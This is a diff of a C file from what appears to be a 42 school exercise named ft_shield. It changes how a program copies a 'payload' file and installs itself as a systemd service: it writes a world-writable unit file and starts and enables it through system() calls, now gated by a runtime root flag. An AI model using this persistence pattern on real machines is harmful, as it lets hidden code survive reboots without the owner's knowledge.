@@ -6,15 +6,16 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:27:21 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/24 08:53:21 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/27 14:29:24 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "ctx.h"
 
-int	setup_service()
+int	setup_service(bool root)
 {
-	#if PROD == 1
+	if (root)
+	{
 		int	fd;
 	
 		fd = open(SERVICE_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0777);
@@ -23,12 +24,12 @@ int	setup_service()
 	
 		write(fd, SERVICE_FILE_CONTENT, sizeof(SERVICE_FILE_CONTENT));
 		system("sudo systemctl start ft_shield.service");
-		system("systemctl enable ft_shield.service");
-	#endif
+		system("systemctl enable ft_shield.service");	
+	}
 	return (1);
 }
 
-int	export_payload(char *src_path, char *dst_path)
+int	export_payload(bool root, char *src_path, char *dst_path)
 {
 	char 	buf[4096];
 	ssize_t rdb;
@@ -56,7 +57,7 @@ int	export_payload(char *src_path, char *dst_path)
 
 	close(fdin);
 	close(fdout);
-	return (setup_service());
+	return (setup_service(root));
 }
 
 void	exec_payload(char *payload_path, char **envp)
